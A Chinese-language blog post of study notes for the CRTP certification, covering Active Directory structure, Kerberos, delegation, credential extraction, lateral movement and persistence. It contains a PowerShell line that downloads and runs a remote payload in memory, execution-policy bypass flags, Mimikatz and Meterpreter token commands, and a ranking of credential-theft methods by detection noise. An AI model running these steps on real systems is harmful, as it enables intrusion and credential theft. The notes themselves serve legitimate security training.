---
title: CRTP 學習與策略規劃
date: 2026-02-21
categories:
  - 紅隊
tags : 
  - CRTP
---

## 前言
<br>
CRTP（Certified Red Team Professional）是由 Altered Security 推出的紅隊證照，核心聚焦在 Active Directory 內網攻擊技術。

如果用一句話概括：

```bash=
CRTP 是一張專門針對 AD 攻擊路徑與權限濫用技術的證照。
```

過去的實戰經驗中，內網滲透往往是透過既有漏洞取得初始跳板，例如利用 CVE 進入主機後，直接開始橫向移動與權限提升，最終目標通常也是指向 Active Directory。

整體流程大致為：

```bash=
1day CVE → Webshell → RDP → 關閉防護機制 → 工具利用 → 橫向移動 → 進入 AD
```
這種打法屬於高度結果導向的實戰流程。任務能完成、目標能達成，但回頭檢視會發現，對於 AD 架構本身的設計邏輯、權限模型以及認證機制，理解多半停留在操作層，而非系統層。思考後發現，最大的差異是軍中通常是以目標導向為主，與其只依賴工具與既有手法，不如回頭把 AD 的核心知識與攻擊原理重新整理一次。最近剛好有兩位朋友對 CRTP 感興趣，提議一起準備這張證照，於是決定花時間系統化補齊這一塊。

### CRTP 學習資源與流程

官方網址 : 

```bash= 
https://www.enterprisesecurity.io/
```

成功登入後，可在 Dashboard 中看到 `Attacking and Defending Active Directory Lab - CRTP` 訂閱 Lab。

主要功能區包含：
- Lab Details
- Lab Manual
- Certification Exam
- Flag Verification
- Lab Material
- How to use Discord
- FAQs

其中最核心的學習資源集中在 `Lab Manual`，內容涵蓋課程影片、PDF 教材與相關工具包，是整套 CRTP 的知識主體，其他區塊則偏向環境說明、考試資訊與實驗室操作輔助。

![CRTP-Lab Material](/img/Material.png)

基本學習思路 : 

```bash=
Course Videos
（快速理解整體架構）
        ↓
Lab Connection Guide
（解決 Lab 連線問題）        
        ↓
Access Lab Material
（Lab 驗證）
        ↓
Walkthrough Videos
（僅在卡關時使用）
```

整體原則為：

```bash=
先建立全局架構，再透過 Lab 驗證理解，Walkthrough 僅作為輔助，而非主要學習來源。
```

### 學習效率優化

#### 雙語字幕輔助流程

CRTP 課程皆為全英文解說、無中文字幕，單純硬聽其實效率不高。與其反覆倒帶，不如把問題工程化處理。因此結合 Whisper 與 ChatGPT，先將影片轉為字幕，再進行翻譯與結構化整理，建立一套雙語輔助學習流程。保留技術術語原文，同時提升理解效率。後續也會將整個流程封裝成工具，放上 GitHub，並考慮導入 CI/CD 或容器化，方便長期維護與團隊使用。

因此建立以下流程：

```bash=
Whisper → 產生 SRT → ChatGPT 翻譯 → 結構化整理 → 建立雙語學習素材
```

#### 環境準備

安裝 Whisper :

```bash=
pip install -U openai-whisper
pip install torch
```

執行 Whisper : 

```bash=
Whisper
```

![Whisper](/img/Whisper.png)

下載 full_build.7z 並將 `ffmpeg.exe` 加入環境變數。

```bash=
https://www.gyan.dev/ffmpeg/builds/
```

![ffmpeg](/img/ffmpeg.png)

批量將所有 `.mp4` 檔案轉成 `.srt` 檔案，並存放在 `Course_output_en` 資料夾中。

```bash= 
for %f in (*.mp4) do whisper "%f" --model small --language English --output_dir Course_output_en --output_format srt
```

![批量轉 srt 檔案](/img/srt.png)

轉換時間較長，後續可研究更高效處理方式。

![srt_en](/img/srt_en.png)

接著透過自製工具批量翻譯字幕。

```bash=
https://github.com/zxc7528064/SRT-Translator
```

翻譯後生成 `srt_zh` 檔案，並確認時間軸未發生錯位。

![srt_cn](/img/srt_cn.png)

實際匯入後，字幕與時間同步正常，即可正式進入學習階段。

![sucess_srt_zn](/img/sucess_srt_zn.png)

### Active Directory 攻擊框架

待畫心智圖

### Module 1 
- Introduction to Active Directory and Attack Methodology
- Offensive PowerShell and .NET tradecraft
- Domain Enumeration

![AD_image](/img/AD_image.png)

AD 的核心功能，它提供三大核心能力：
- Manageability（集中管理）
- Security（驗證與授權）
- Interoperability（跨系統整合）

幾乎所有 Windows Server、Client、Application、Email、Network Device 都圍繞 AD 運作。

重點：

```bash=
控制 AD = 控制整個企業環境
```

理解 AD 的結構框架（mental model）

```bash=
Forest
│
├── Schema Partition
│     ├── ObjectClass 定義
│     └── Attribute 定義
│
├── Configuration Partition
│     ├── Sites
│     ├── Services
│     └── Trust Objects
│
└── Domain Partition
      └── Object Tree
            └── Object
                  ├── ObjectClass
                  ├── Attributes (資料欄位)
                  └── Security Descriptor (權限控制)
                        ├── Owner
                        ├── DACL (決定誰可以對這個 Object 做什麼)
                        │     └── ACE
                        └── SACL
```

Schema 與物件屬性 ： Active Directory 本質上是一個「物件導向的目錄資料庫」。

在 AD 中，所有資源都以「物件（Object）」的形式存在，例如：

- User
- Computer
- Group
- Organizational Unit (OU)
- Domain Controller
- Service Account
- GPO

每個物件都包含多個「屬性（Attribute）」，例如：

- sAMAccountName
- userPrincipalName
- memberOf
- objectSID
- servicePrincipalName

| 攻擊類型                   | 關鍵屬性                               | 真正本質              |
| ---------------------- | ---------------------------------------- | ----------------- |
| Kerberoasting          | servicePrincipalName                     | 可讀 SPN + 可請求 TGS  |
| SPN Abuse              | servicePrincipalName                     | 可寫 SPN            |
| Constrained Delegation | msDS-AllowedToDelegateTo                 | 可控制委派目標           |
| RBCD                   | msDS-AllowedToActOnBehalfOfOtherIdentity | 可寫 delegation ACL |
| ACL Abuse              | nTSecurityDescriptor                     | 可改物件權限            |

重點：
```bash=
多數 AD 攻擊建立在「物件 Attribute 屬性 + ACL 權限機制」之上。
```

Domain (網域) ：

公司內部帳號與電腦的管理範圍。

- 每個 Domain 擁有獨立的使用者、電腦與群組物件（User、Computer、Group、Service Account），儲存在該 Domain 的 AD 資料庫（NTDS.dit）中。
- Domain 由一或多台 Domain Controller（DC）維護，負責儲存 AD 資料庫（NTDS.dit）、驗證使用者身分與發放存取權限。
- 預設使用 Kerberos 作為主要驗證機制，在某些情況下（例如舊系統或 SPN 解析失敗）會回退至 NTLM。

Domain 內部通常共享：
- 身份資料庫：所有帳號與群組資訊儲存在 AD 物件中。
- 安全政策（Security Policy）：密碼長度、複雜度、帳號鎖定策略等。
- 群組原則（GPO）：集中套用系統設定與安全設定至電腦與使用者。
- 信任關係（Trust Relationship）：允許跨 Domain 或跨 Forest 的身份驗證與資源存取。

重點：

```bash=
MS-DRSR 協定 : Domain Controller 之間用來同步 Active Directory 資料的官方協定。

Active Directory
      ↓
Replication 機制
      ↓
MS-DRSR 協定
      ↓
DRSUAPI 介面
      ↓
物件屬性資料同步

DCSync：濫用 Directory Replication（目錄複寫）權限，透過 MS-DRSR（DRSUAPI）複寫介面向 Domain Controller，請求帳號屬性資料，可取得 NTLM hash、Kerberos 金鑰與 KRBTGT hash。

DCShadow：濫用 AD 複寫機制，暫時將攻擊主機註冊為一台 Domain Controller，注入惡意物件屬性變更，並透過正常 replication 流程推送至其他 DC。

控制 KRBTGT hash = 可偽造 Kerberos Golden Ticket，偽造任意使用者身份，而整個網域都會相信。
```

Forest（森林）： AD 架構的最高層級。

![Forest](/img/Forest.png)

包含：
- 多個 Domain
- 共用同一個 Schema（所有 Domain 的資料結構都必須一致）
- 共用全域目錄（Global Catalog）
 
重點 :
```bash=
Active Directory 森林權限與信任模型：

Forest
│
├── Schema Partition
├── Configuration Partition
│
├── Forest Root Domain
│      ├── Domain Admins (管理 root domain)
│      ├── Enterprise Admins (森林層級權限)
│      └── Schema Admins (Schema 管理)
│
├── Child Domain A
│      └── Domain Admins
│
└── Child Domain B
       └── Domain Admins

在同一 Forest 內，各 Domain 透過 Parent-Child 與 Tree 架構，形成預設雙向且可傳遞（Transitive）的信任鏈。

Domain A ↔ Domain B ↔ Domain C
        ↑______________↑
         自動形成傳遞信任

Enterprise Admins 存在於 Root Domain，具有管理整個 Forest 結構（Schema、Configuration、Domain）的能力，但實際資源存取仍受各 Domain ACL 控制。
```

在 Active Directory 內網滲透中，PowerShell 與 .NET 是最核心的攻擊載體。

- 理解 PowerShell 在 AD 攻擊中的角色
- 理解 Windows 環境的偵測面
- 理解何時應使用 PowerShell、何時應改用 .NET Binary

為什麼 PowerShell 是 AD 攻擊核心載體 ?

PowerShell 具備：

- 預設安裝於 Windows 系統
- 原生 .NET 支援
- PowerShell 可直接跟 AD 交互（查資料、改資料，而不需要額外工具）
- 支援記憶體執行
- 可直接調用 Windows API

在 AD 內網滲透中，幾乎所有 Enumeration 行為都可透過 PowerShell 完成：

- 列出 User / Group / Computer
- 查詢 SPN
- 查詢 ACL
- 查詢 Delegation
- 查詢 Trust

AD 模組與基本操作

載入 AD 模組：

```bash=
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
Get-Command -Module ActiveDirectory
```

重點：
- 使用 AD 相關 cmdlet
- 進行 Domain Enumeration
- 查詢 user / group / SPN / ACL

記憶體執行（Memory Execution）

```bash=
iex (New-Object Net.WebClient).DownloadString('http://www.webserver/payload.ps1')
```

重點：
- 記憶體載入（fileless execution）
- 不落地執行腳本
- 減少檔案型 AV 偵測

PowerShell Detection Surface（偵測面）

理解防禦面，才能理解攻擊面。

```bash=
System-wide transcription
- 記錄整個 PowerShell 互動過程（指令與輸出）
- 主要用於事後取證

Script Block Logging
- 記錄還原後的完整腳本內容
- 即使混淆或編碼，仍可能被還原記錄
- 重要事件 ID：4104

AMSI (AntiMalware Scan Interface)
- 將腳本內容送交 AV / EDR 掃描
- 屬於即時掃描機制
- 是否阻擋取決於防毒引擎

流程概念：
PowerShell Script
        ↓
AMSI Hook
        ↓
AV / EDR Engine
        ↓
Allow / Block

Constrained Language Mode (CLM)
- 限制 PowerShell 可使用的功能
- 通常與 AppLocker
- 屬於功能限制，而非純偵測機制
```

Execution Policy（執行策略）

常見參數：

```bash= 
powershell -ep bypass
powershell -c <cmd>
powershell -encodedcommand <base64>
或在當前程序中：
Set-ExecutionPolicy Bypass -Scope Process
```

重點：
- 它只是防止誤執行腳本
- 真正的限制來自 AMSI / CLM / AV

Tradecraft 不是工具清單，而是：

- 目標環境是否啟用 Script Block Logging？
- 是否部署 EDR？
- 是否開啟 CLM？
- 是否允許 PowerShell 遠端執行？
- 是否應改用 .NET Binary？

PowerShell 本質是 .NET。

在高監控環境中，可能改用：
- 直接撰寫 C# 工具
- 使用 .NET API 操作 LDAP
- 減少 PowerShell 特徵

常見策略：
- Source Code Obfuscation
- 字串混淆
- API 間接調用
- 編譯為獨立 Binary

混淆與偵測研究工具（研究用途）

工具的價值在於理解偵測邏輯，而非盲目繞過。

- AMSITrigger → 測試哪段程式碼觸發 AMSI
- DefenderCheck → 測試哪段內容被 Defender 標記
- Invoke-Obfuscation → PowerShell 混淆框架
- ConfuserEx → .NET 混淆工具

---

AD 後滲透模型流程：

```bash=
Initial Foothold
      ↓
PowerView 手動枚舉
      ↓
建立 AD 權限模型
      ↓
BloodHound 計算攻擊路徑
      ↓
ACL / Delegation / Credential Abuse
      ↓
Domain Controller Compromise
```

常用工具：

| 工具 | 角色 | 功能定位 |
|------|------|----------|
| PowerView | 手動枚舉 | 查詢 AD 物件與 ACL |
| SharpView | 隱蔽枚舉 | C# 版 AD 枚舉工具，適用於限制 PowerShell 的環境 |
| BloodHound CE | 圖論分析 | 計算最短攻擊路徑 |
| SOAPHound | ADCS 枚舉 | ADCS 與憑證模板關係枚舉工具 |
| PowerHuntShares | 共享枚舉 | 尋找敏感檔案與憑證（GPP密碼、備份檔、設定檔）|
| RunWithRegistryNonAdmin.bat | 執行技巧 | 利用註冊表機制在低權限情境下啟動程式 |

AD / Windows 權限判斷的核心機制：

```bash=
Access Token 對 DACL 中 ACE 的逐條匹配過程，而 Deny 永遠優先。
```

驗證流程：

![ACLs](/img/ACLs.png)

```bash=
使用者登入
     ↓
DC 驗證成功（Kerberos / NTLM）
     ↓
LSASS 建立 Access Token
     ↓
Process 繼承 Access Token
     ↓
嘗試存取 Object
     ↓
讀取 Object 的 DACL
     ↓
逐條比對 ACE
     ↓
命中 Deny → 立即拒絕（Deny 優先）
命中 Allow → 允許
全部未命中 → 拒絕
```

在 Active Directory 中：

```bash=
GPO + OU Link = 批量控制行為的機制
```

重要的是： OU 與 GPO 本身也是受 ACL 控制的物件，可以被濫用的控制節點。

常見濫用權限，如果攻擊者對 OU 具有以下權限：

```bash=
WriteDACL
GenericAll
WriteOwner
```

GPO（Group Policy Object）的本質

```bash=
一種可以套用到 OU / Domain 的設定物件。
```

可以影響：
- 電腦設定
- 使用者設定
- 安全政策
- 啟動腳本
- 登入腳本

簡單說： GPO 是批量控制系統行為的工具。

橫向權限放大流程：

```bash=
取得 OU 控制權（GenericAll / WriteDACL）
        ↓
修改 GPO Link 或建立惡意 GPO
        ↓
修改 GPO 內容（加入惡意設定）
        ↓
等待 Group Policy 更新（gpupdate / 90 min）
        ↓
影響 OU 下所有電腦或使用者
```

Trust 是什麼 ?

```bash=
Trust 是不同 Domain / Forest 之間的身份驗證信任機制。
```

若存在 Trust，代表身份驗證可以跨域流動，攻擊面可能被擴大。

Trust 分析三大維度
- Direction（方向）
- Type（類型）
- Attributes（屬性）

Trust 的方向 ≠ 存取方向

![Trust_Direction](/img/Trust_Direction.png)

代表：左側網域會接受右側網域的身分驗證結果（Authentication）
但實際 Access 實際存取方向：右側網域的使用者 → 左側網域的資源

Direction（方向）：
- One-way trust（單向）→ 只有一側可以跨域驗證
- Two-way trust（雙向）→ 兩側都可以跨域驗證

![Two-way-trust](/img/Two-way-trust.png)

Type（類型）：
- Parent-Child
- Tree-Root
- Forest
- External

Tree-Root：Forest 內的多個 Tree 不是隔離的，而是透過 Root Domain 串接，形成完整可傳遞的信任結構。

![Tree-root-Trust](/img/Tree-root-Trust.png)

External：跨 Forest 的點對點信任，預設不具傳遞性，範圍受限。

![External-Trust](/img/External-Trust.png)

Forest：如果某個 Forest 被攻破，而它和其他 Forest 有 Forest Trust，攻擊面可能會橫向擴散。

![Forest-Trust](/img/Forest-Trust.png)

Attributes（屬性）：

若 A 信任 B，B 信任 C，且該 trust 為 transitive，則 A 會間接信任 C。

A ↔ B ↔ C
↑________↑
自動形成信任鏈

關鍵屬性：
- 是否 Transitive（可傳遞）
- 是否啟用 SID Filtering

![Transitive](/img/Transitive.png)

跨域攻擊決策模型：

```bash=
已控制 Domain A
↓
枚舉 Trust 關係
↓
分析 Direction / Type / Attributes
↓
判斷是否可跨域驗證
↓
尋找跨域可濫用權限
↓
User Hunting（高權限帳號在哪?）
↓
定位落點主機
↓
橫向移動至 Domain B
```

### Module 2 
- Local Privilege Escalation
- Credential Extraction & Lateral Movement
- Domain Privilege Escalation

當取得初始立足點（Foothold）後，下一個目標通常是：

```bash=
低權限使用者
    ↓
Local Administrator
    ↓
SYSTEM 權限
```

漏洞型（Patch / Exploit）：
利用系統尚未修補的漏洞進行提權
如：
- 已知 Local Privilege Escalation CVE

憑證型（Credential Exposure）：
透過系統遺留的明文憑證進行提權。
包括：
- unattended.xml（自動部署檔）
- 自動登入密碼（AutoLogon）
- Registry 中的明文憑證
- 特殊設備（kiosk / 自動化設備）的內建帳號

設定錯誤型（Misconfiguration）：
如：
- 可覆寫服務 binary
- 可修改服務參數（Unquoted Service Path）
- 過度寬鬆的 Service ACL
- DLL Hijacking
- AlwaysInstallElevated 設定錯誤

由於本地提權可能性眾多，通常會搭配自動化工具進行檢查：
- PowerUp
- winPEAS
- Privesc 系列工具
- AutoLogon 檢查工具

實戰流程通常如下：

```bash=
Foothold
   ↓
檢查系統弱點（Patch / Kernel）
   ↓
檢查憑證殘留（XML / Registry / AutoLogon）
   ↓
檢查 ACL 與服務配置
   ↓
嘗試提升為 SYSTEM
```

本地特權提升的關鍵在於尋找 **憑證殘留** 與 **系統設定錯誤**，而不是單純依賴漏洞。

Feature Abuse（企業服務功能濫用）

```
濫用企業應用程式或服務的功能來取得更高權限。
```

為什麼企業環境容易出現，因為企業內部常存在大量系統：
- DevOps、CI/CD
- 監控系統
- 自動化服務

服務通常安全設計較弱，但卻常常以 **SYSTEM / Administrator** 權限運行。

典型案例：
- Jenkins

早期 Jenkins：
- 預設沒有 Authentication
- 任何人可以存取 console
- 可直接執行 command

攻擊流程：

```bash=
Script Console
↓
Groovy script execution
↓
Command execution on host
```

如果 Jenkins 服務是 SYSTEM 執行 → 直接 SYSTEM shell

Token Impersonation：
是讓 Process 中的某個 **Thread** 暫時使用另一個使用者的 **Access Token**，以該使用者身份存取系統資源。

在 Windows 中：
- Process 會持有 Primary Token (預設身份)
- Thread 可以使用 Impersonation Token (暫時身份)

Access Token 代表 Windows 的 Security Context，包含：
- User SID
      ex : Administrators
- Group SID
      ex : Administrators
- Privileges
      ex : SeDebugPrivilege、SeImpersonatePrivilege
- Integrity Level
      ex : High

**Access Token = 身份 + 群組 + 權限**

Mimikatz 常見操作：

```bash=
token::elevate
```

Meterpreter 常見操作：

```bash=
list_tokens -u
impersonate_token DOMAIN\Administrator
```

核心概念：

```bash= 
Access Token
↓
SeImpersonatePrivilege
↓
Named Pipe / COM / RPC
↓
Potato Attack
↓
SYSTEM Token
↓
Privilege Escalation
```

在 Windows Privilege Escalation 中，Token Impersonation 常與 **SeImpersonatePrivilege** 或 **SeAssignPrimaryTokenPrivilege** 搭配使用。

---

在取得 **Local Administrator / SYSTEM** 權限後，攻擊者通常會嘗試取得系統中的 Credential，以便進一步進行橫向移動或權限提升。

常見取得的憑證包括：
- NTLM Hash
- Kerberos Ticket
- AES Key
- Plaintext Password

LSASS - Credential 的核心來源：
Windows 身份驗證系統由 **LSA (Local Security Authority)** 負責，實際運作的 process 為 **lsass.exe**。

LSASS 負責：
- User Authentication
- Kerberos Authentication
- NTLM Authentication
- Security Policy
- Token Creation

當使用者登入系統時，憑證會被載入 **LSASS memory**。

常見情境：
- Local login
- RDP login
- RunAs
- Scheduled tasks
- Service login
- Remote administration

從 LSASS 記憶體中通常可以取得：
- NTLM Hash
- Kerberos Tickets
- AES Keys
- Plaintext Password
- WDigest Credentials
- SSP Credentials

常見工具：
- mimikatz
- sekurlsa
- procdump

LSASS 是 Windows 系統中 **最容易被監控的 process**，因此 Dump LSASS 常會觸發告警。

EDR / Defender 會監控：
- OpenProcess(lsass)
- ReadProcessMemory
- MiniDumpWriteDump
- Process Handle Access

本地帳號 hash 儲存在 registry：
- HKLM\SAM
- HKLM\SYSTEM（BootKey 用於解密 SAM）

可取得
- Local NTLM Hash

常用工具：
- reg save
- secretsdump.py

LSA Secrets 儲存在 **HKLM\SECURITY** 包含：
- Service account password
- Scheduled task credentials
- Cached domain credentials

Windows Data Protection API 用於加密應用程式憑證。

常見使用：
- Credential Manager
- Browser password
- Browser cookies
- Private keys
- Azure tokens

Windows Credential Manager 儲存各種登入資訊。

工具：
- vaultcmd

取得：
- RDP credentials
- Stored passwords

瀏覽器也常儲存登入資訊。

例如：
- Chrome
- Edge
- Firefox

取得：
- Saved passwords
- Cookies
- Session tokens

PowerShell command history 可能包含憑證。

路徑：**%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt**

整體 Credential 儲存位置可以整理為：

```bash=
Windows System
│
├─ LSASS memory
│    ├ NTLM Hash
│    ├ Kerberos Ticket
│    ├ Plaintext Password
│
├─ Registry
│    ├ SAM
│    ├ LSA Secrets
│
├─ DPAPI
│    ├ Browser Password
│    ├ Credential Vault
│
├─ Applications
│    ├ Browser Cookies
│    ├ Azure Tokens
│
└─ User Artifacts
     ├ PowerShell History
     ├ Scripts
```

實戰中通常會依據 **Detection Risk** 使用技術。

Low Noise：
- Registry extraction
- DPAPI
- Credential vault
- Browser credential
- PowerShell history

Medium Noise：
- SAM dump
- LSA secrets

High Noise：
- LSASS dump
- Mimikatz

成熟的 Red Team 會優先使用 **Non-LSASS Credential Extraction**。

例如：
- SAM
- LSA secrets
- DPAPI
- Credential vault
- Browser credentials

---

在取得初始立足點（Initial Foothold）後，攻擊者通常會嘗試在內網環境中進行橫向移動（Lateral Movement），以存取更多主機與資源。

在 Windows / Active Directory 環境中，橫向移動往往建立在身份驗證機制之上，例如 **NTLM** 與 **Kerberos**。一旦攻擊者取得憑證資料（Credential），例如 **NTLM Hash、Kerberos Ticket 或 Access Token**，即可模仿其他使用者身份並存取遠端系統。

Kerberos 基本流程：

![Kerberos](/img/Kerberos.png)

```bash=
User
↓
AS (Authentication Service)
↓
TGT
↓
TGS (Ticket Granting Service)
↓
Service Ticket
↓
Service Access
```

如果攻擊者取得 Kerberos Ticket（TGT 或 TGS），即可將 Ticket 注入目前的 Session，藉此模仿使用者身份並存取相關服務，進而進行 Lateral Movement。

Pass-the-Hash (PtH)： 
攻擊者利用已取得的 **NTLM Hash** 進行身份驗證，而不需要知道使用者的明文密碼，直接利用該 Hash 登入其他系統。

核心概念：

```bash=
取得 NTLM Hash
↓
使用 Hash 進行 NTLM 認證
↓
存取遠端系統
```

效果：
- 不需要知道明文密碼
- 可以冒充使用者身份
- 可進行橫向移動（Lateral Movement）

Pass-the-Ticket (PtT)：
攻擊者將已取得的 Kerberos Ticket 注入到目前 Session 中，藉此模仿該使用者身份並存取相關服務。

核心概念：

```bash=
取得 Kerberos Ticket（TGT 或 TGS）
↓
將 Ticket 注入目前 Session
↓
模仿該使用者身份
↓
存取相關服務
```

Pass-the-Ticket = 使用已取得的 **Kerberos Ticket(TGT 或 TGS)** 來冒充使用者身份。

Golden Ticket：
攻擊者偽造 **Kerberos TGT (Ticket Granting Ticket)** 的技術，藉此取得整個 Active Directory Domain 中任意服務的存取權限。

核心概念：

```bash=
取得 KRBTGT Hash
↓
偽造 Kerberos TGT
↓
注入票證
↓
向 KDC 取得任意 TGS
↓
存取網域資源
```

效果：
- 可以在整個 Domain 中維持長期存取權限
- 可以偽造任何使用者身份（例如 Administrator）
- Domain Controller 會將偽造的 TGT 視為合法票證

Silver Ticket： 
攻擊者利用服務帳號的 **NTLM hash**，自行偽造 **Kerberos Service Ticket (TGS)** 以冒充任意使用者存取該服務，與 Golden Ticket 不同的是 Silver Ticket 不需要與 **Domain Controller (KDC)** 互動。

核心概念：

```bash=
取得服務帳號的 NTLM Hash
↓
偽造 Kerberos 服務票證（TGS）
↓
將票證注入目前的 Session
↓
以偽造身份存取目標服務
```

常見服務：

| SPN   | 服務  |
| ----- | ---------------- |
| CIFS  | SMB / File Share |
| HTTP  | Web Server / IIS |
| MSSQL | SQL Server       |

特性：
- 不需要聯絡 DC
- 偵測難度較高
- 只影響特定服務

常見的橫向移動技術：
- PSExec
- WMI
- RDP
- SMB
- PowerShell Remoting
- WinRM

其中 **PowerShell Remoting** 是現代 Windows 環境常見的一種方式，運用的底層技術 **WinRM (Windows Remote Management)**
- 透過 PowerShell 遠端控制另一台 Windows 主機

```bash=
Local PowerShell
↓
PowerShell Remoting
↓
WinRM (WS-Management implementation)
↓
Remote Host
↓
wsmprovhost.exe
↓
Remote PowerShell Session
```

特性：
- Windows 原生功能
- 不需要額外工具
- 在企業環境非常常見
- 適合用於 Lateral Movement

Default Ports：

```bash=
5985 → HTTP
5986 → HTTPS
```

建立遠端 session：

```bash=
New-PSSession
```

進入遠端 shell：

```bash=
Enter-PSSession -ComputerName TARGET
```

遠端執行指令：

```bash=
Invoke-Command -ComputerName TARGET -ScriptBlock { command }
```

PowerShell Remoting 會留下以下痕跡：

Process：
- wsmprovhost.exe
- powershell.exe

核心重點：
- PowerShell Remoting 使用 WinRM
- WinRM 使用 5985 / 5986 port
- 成功連線會建立 wsmprovhost.exe
- 取得 Local Administrator 權限可進行 lateral movement

Kerberoasting：是一種 Active Directory Credential Extraction 攻擊技術。

目的：取得 Service Account 密碼
條件：只需要 Domain User 權限，因為任何 Domain User 都可以請求 SPN 的 Service Ticket

核心概念：

```bash=
取得 Domain User
        ↓
列舉 SPN
        ↓
請求 Service Ticket
        ↓
取得 Kerberos TGS
        ↓
擷取 TGS 內的加密資料
        ↓
Offline Crack
        ↓
取得 Service Account
```

Kerberos Delegation 是一種 **服務可以代表使用者存取其他服務的機制**。

核心概念：
```bash=
User → Service A → Service B
```
Service A 可以使用 **使用者的身份** 去存取其他服務。

常見應用場景：
```bash=
User
 ↓
Web Server
 ↓
SQL Server
```

當使用者登入 Web Server 時，Web Server 需要 代表使用者身份 存取 SQL Server，因此需要使用 **Kerberos Delegation**

主要有三種 Delegation：
- Unconstrained Delegation
- Constrained Delegation
- Resource-Based Constrained Delegation (RBCD)

其中 **Unconstrained Delegation** 風險最高。

Unconstrained Delegation 原理：
如果一台主機被設定為 **Trusted for delegation** 當使用者登入該主機時，KDC 會將使用者的 TGT (Ticket Granting Ticket) 傳給該主機，因此 User TGT 會被儲存在該服務主機上，因此該服務可以代表使用者存取其他服務。

如果攻擊者控制了 Unconstrained Delegation 主機

```bash=
控制 Unconstrained Delegation 主機
        ↓
等待高權限使用者登入
        ↓
取得使用者 TGT
        ↓
使用 TGT 冒充該使用者
```

如果登入的使用者是 Domain Admin 攻擊者即可取得 Domain Admin 權限。

RBCD(Resource-Based Constrained Delegation) 是 **Kerberos Delegation 的一種形式** 

核心概念： 由 **目標主機 (Target Resource)** 決定誰可以代表使用者存取自己

這與傳統 Delegation 的差異是：

```bash=
Traditional Delegation → Service 決定可以代理誰
RBCD → Target Resource 決定誰可以代理自己
```

主要依賴 AD 中的一個屬性 **msDS-AllowedToActOnBehalfOfOtherIdentity** 
屬性定義 **哪些帳號可以代表使用者存取該主機** 如果攻擊者可以修改該屬性，就可以建立 RBCD Delegation。

RBCD 通常搭配 **Kerberos S4U (Service for User)** 機制：
- S4U2Self
- S4U2Proxy

流程概念：
```
Service
↓
S4U2Self
↓
取得 impersonation ticket
↓
S4U2Proxy
↓
存取目標服務
```

透過 S4U 機制，服務可以 **冒充任意使用者存取目標服務**

RBCD 攻擊流程：

```bash=
取得 Domain User
↓
建立惡意 Computer Account
↓
修改 Target Host 的 ACL
↓
寫入 msDS-AllowedToActOnBehalfOfOtherIdentity
↓
建立 RBCD Delegation
↓
使用 Kerberos S4U 進行 impersonation
↓
取得 Target Host 存取權
```

---

網域層級提權（Domain Privilege Escalation）

NTLM Relaying：
一種利用 NTLM 身份驗證機制的攻擊技術，攻擊者不需要取得使用者的密碼，而是將受害者的 NTLM 身份驗證 **即時轉發（relay）** 到其他服務，以冒充該使用者進行存取。

核心概念：

```bash=
Victim authentication
        ↓
Attacker relay
        ↓
Target service
```

GPO Abuse（Group Policy 濫用）：
如果 **Group Policy Object (GPO)** 的 ACL 權限設定過於寬鬆，攻擊者可以修改 GPO 設定，進而影響整個網域的電腦。

核心概念：

```bash=
取得 GPO 修改權限
      ↓
修改 GPO 設定
      ↓
建立 Scheduled Task / Startup Script
      ↓
Domain Computer 套用 GPO
      ↓
在多台主機執行 payload
```

例如：
- powershell payload
- cmd execution
- 新增 admin user

GPO 會影響所有被 linked 的 OU / Domain Computer

GPOddity：
一種利用 **Group Policy 與 SYSVOL 設計特性** 的攻擊技術，攻擊者可以透過修改 GPO 的屬性，使 Domain Computer 從攻擊者控制的位置載入惡意 Policy。

核心概念：

```bash=
NTLM Relay
      ↓
修改 GPO attribute
      ↓
修改 GPCFileSysPath
      ↓
指向 attacker share
      ↓
Domain computer 載入惡意 policy
```

### Module 3
- Domain Persistensce
- Cross Trust Attacks

AD 持久化攻擊技術分類

```bash=
AD Persistence
├─ Kerberos Abuse
│  ├─ Golden Ticket
│  ├─ Silver Ticket
│
├─ Credential Backdoor
│  ├─ Skeleton Key
│  └─ SSP Persistence
│
├─ ACL Abuse
│  └─ AdminSDHolder
│
└─ Configuration Abuse
   ├─ GPO Persistence
   └─ DSRM
```

在 Active Directory 攻擊流程中，許多初學者的目標往往是取得 **Domain Admin** 然而在成熟的紅隊攻擊模型中 **Domain Admin 並不是最終目標**。
真正的目標是能夠 **長期控制 Active Directory** 攻擊者通常會建立 **Domain Persistence**，確保即使帳號或憑證被重置，仍然能重新取得對 AD 的控制權。

Active Directory 的身份驗證核心機制是 **Kerberos**。

Kerberos 的基本流程如下：

```bash=
Client  
↓  
KDC (Domain Controller)  
↓  
TGT (Ticket Granting Ticket)  
↓  
Service Ticket  
↓  
Access Service
```

在 Kerberos 中，所有 Ticket 都是由一個特殊帳號簽發：**KRBTGT**。

如果攻擊者取得 **KRBTGT Hash** 就可以偽造 Kerberos Ticket 這種攻擊方式被稱為 **Golden Ticket Attack**。

Golden Ticket 允許攻擊者：

- 偽造任意使用者身份
- 偽造 Domain Admin 權限
- 在憑證被重置後仍然重新取得存取權

在前面的橫向移動章節中已經介紹過，攻擊者可以透過取得 **KRBTGT Hash** 偽造 Kerberos TGT，進而向 KDC 請求任意服務的 TGS，取得對網域資源的存取權限。

除了用於橫向移動外，Golden Ticket 最典型的 **Domain Persistence 技術之一** 只要攻擊者持有 **KRBTGT Hash**，就可以持續偽造 Kerberos Ticket，即使帳號或憑證被重置，仍然能重新取得對 Domain 的控制權。

在實際攻擊中，生成 Golden Ticket 通常需要以下資訊：
- Domain SID
- User RID
- KRBTGT Hash

攻擊者可以利用這些資訊偽造 Kerberos TGT，並冒充任意使用者，Golden Ticket 的 **Ticket Lifetime** 可以由攻擊者自行設定，例如：**10 years**

Silver Ticket 在 Active Directory 攻擊中不僅可用於 **橫向移動（Lateral Movement）**，在某些情況下也可以作為 **Persistence 技術**。

由於 Silver Ticket 是攻擊者 **自行偽造 Kerberos Service Ticket (TGS)** 服務端只會使用自己的 **Service Key** 驗證票證是否合法，因此不需要與 **Domain Controller (KDC)** 進行驗證。

代表只要攻擊者持有 **Service Account Hash** 就可以在任何時候重新生成合法的 Kerberos Service Ticket (TGS)。

核心概念：

```bash=
Service Account Hash
↓
偽造 Kerberos Service Ticket (TGS)
↓
注入 Ticket
↓
持續存取該服務
```

與 Golden Ticket 的差異：

| 攻擊          | 偽造  | 需要什麼 Hash     | 權限範圍      | Persistence 強度 |
| ------------- | --- | -------------------- | ---------- | --------------- |
| Golden Ticket | TGT | KRBTGT Hash          | 整個 Domain  | 非常高 | 
